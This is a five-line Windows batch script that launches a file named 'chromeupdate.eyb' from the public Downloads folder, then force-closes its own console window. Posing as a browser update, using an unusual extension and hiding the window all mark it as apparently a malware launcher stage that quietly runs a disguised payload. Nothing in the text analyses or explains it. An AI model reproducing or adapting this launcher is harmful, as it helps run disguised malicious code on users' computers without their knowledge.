@ echo off
title=testcmd
start "C:\Windows\System32\cmd.exe" "C:\Users\Public\Downloads\chromeupdate.eyb"
TASKKILL /F /FI "WINDOWTITLE eq testcmd"
exit
